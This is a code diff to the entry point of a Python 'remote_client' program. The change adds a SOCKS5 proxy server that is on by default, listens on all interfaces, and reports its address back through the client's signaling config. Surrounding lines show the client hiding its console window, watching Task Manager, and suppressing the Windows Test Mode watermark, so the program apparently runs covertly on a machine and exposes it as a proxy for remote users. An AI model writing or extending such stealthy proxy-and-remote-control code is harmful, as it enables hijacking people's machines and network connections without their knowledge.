@@ -24,7 +24,7 @@ from remote_client.security.process_monitor import (
     stop_taskmanager_monitor,
     hide_console_window,
 )
-from remote_client.proxy import load_proxy_settings_from_env, set_proxy_settings
+from remote_client.proxy import ProxySettings, load_proxy_settings_from_env, set_proxy_settings
 from remote_client.windows.dpi import ensure_dpi_awareness
 
 # Test Mode watermark remover (Windows only)
@@ -50,6 +50,26 @@ def _hide_test_mode_watermark_enabled() -> bool:
     """Check if Test Mode watermark hiding is enabled."""
     value = os.getenv("RC_HIDE_WATERMARK", "1")
     return value.strip().lower() not in {"0", "false", "no", "off"}
+
+
+def _socks5_enabled() -> bool:
+    value = os.getenv("RC_SOCKS5_DISABLE", "")
+    return value.strip().lower() not in {"1", "true", "yes", "on"}
+
+
+def _socks5_udp_enabled() -> bool:
+    value = os.getenv("RC_SOCKS5_UDP", "1")
+    return value.strip().lower() not in {"0", "false", "no", "off"}
+
+
+def _read_int_env(name: str, default: int) -> int:
+    raw = os.getenv(name)
+    if raw is None:
+        return default
+    try:
+        return int(raw)
+    except (TypeError, ValueError):
+        return default
 
 
 def _start_watermark_remover() -> None:
@@ -87,6 +107,8 @@ def _configure_logging() -> None:
 def main() -> None:
     _configure_logging()
     ensure_dpi_awareness()
+
+    proxy_server = None
 
     # Hide console window on startup if enabled
     if _hide_console_on_start():
@@ -144,6 +166,55 @@ def main() -> None:
             "countries": list(antifraud_config.countries),
         }
     }
+    if _socks5_enabled():
+        try:
+            from remote_client.proxy.socks5_server import Socks5ProxyServer
+
+            proxy_host = os.getenv("RC_SOCKS5_HOST", "0.0.0.0").strip() or "0.0.0.0"
+            proxy_port = _read_int_env("RC_SOCKS5_PORT", 1080)
+            proxy_udp = _socks5_udp_enabled()
+            proxy_server = Socks5ProxyServer(
+                host=proxy_host,
+                port=proxy_port,
+                enable_udp=proxy_udp,
+            )
+            try:
+                proxy_server.start()
+            except OSError as exc:
+                logging.getLogger(__name__).warning(
+                    "SOCKS5 proxy port %s unavailable, selecting random port: %s",
+                    proxy_port,
+                    exc,
+                )
+                proxy_server = Socks5ProxyServer(
+                    host=proxy_host,
+                    port=0,
+                    enable_udp=proxy_udp,
+                )
+                proxy_server.start()
+            public_host = (
+                os.getenv("RC_SOCKS5_PUBLIC_HOST", "").strip()
+                or os.getenv("RC_PROXY_HOST", "").strip()
+            )
+            proxy_payload = {
+                "enabled": True,
+                "type": "socks5",
+                "port": proxy_server.port,
+                "udp": proxy_udp,
+            }
+            if public_host:
+                proxy_payload["host"] = public_host
+            client_config["proxy"] = proxy_payload
+            export_host = public_host or proxy_host
+            set_proxy_settings(
+                ProxySettings(
+                    host=export_host,
+                    port=proxy_server.port,
+                    proxy_type="socks5",
+                )
+            )
+        except Exception as exc:
+            logging.getLogger(__name__).warning("SOCKS5 proxy failed: %s", exc)
     client = build_client(
         session_id,
         signaling_token,
@@ -155,6 +226,11 @@ def main() -> None:
         asyncio.run(client.run_forever())
     finally:
         stop_taskmanager_monitor()
+        if proxy_server is not None:
+            try:
+                proxy_server.stop()
+            except Exception:
+                pass
 
 
 if __name__ == "__main__":
